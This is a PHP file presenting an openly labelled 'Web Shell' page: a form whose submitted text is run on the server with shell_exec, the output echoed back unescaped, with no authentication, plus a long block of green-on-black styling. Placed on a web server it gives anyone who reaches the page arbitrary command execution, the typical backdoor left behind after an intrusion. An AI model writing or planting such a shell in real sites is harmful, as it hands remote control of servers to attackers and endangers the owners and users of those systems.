<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $command = escapeshellcmd($_POST['command']);
    $output = shell_exec($command);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Web Shell</title>
    <link rel="stylesheet" href="./shell.css"> <!-- Corrected href -->
    <style>
        body {
            background-color: #000;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            line-height: 1.6;
            padding: 20px;
        }

        h1, h2 {
            text-align: center;
            color: #00ff00;
        }

        h1 {
            border-bottom: 2px solid #00ff00;
            padding-bottom: 10px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }

        .input-area {
            background-color: #111;
            border: 1px solid #00ff00;
            padding: 10px;
            margin-top: 20px;
        }

        .input-area input {
            width: calc(100% - 22px); /* Full width minus padding */
            height: 40px; /* Set height for the input field */
            background-color: #000;
            color: #00ff00;
            border: none;
            font-family: 'Courier New', Courier, monospace;
            padding: 10px;
        }

        .input-area input:focus {
            outline: none; /* Remove outline on focus */
        }

        button {
            background-color: #00cc00;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: 'Courier New', Courier, monospace;
        }

        button:hover {
            background-color: #009900;
        }

        .output-area {
            background-color: #111;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            margin-top: 20px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Web Shell</h1>
        <form method="post" class="input-area">
            <input type="text" name="command" placeholder="Enter command" required>
            <button type="submit">Execute</button>
        </form>
        <div class="output-area">
            <?php
            if ($_SERVER["REQUEST_METHOD"] == "POST") {
                echo "<pre>$output</pre>";
            }
            ?>
        </div>
    </div>
</body>
</html>
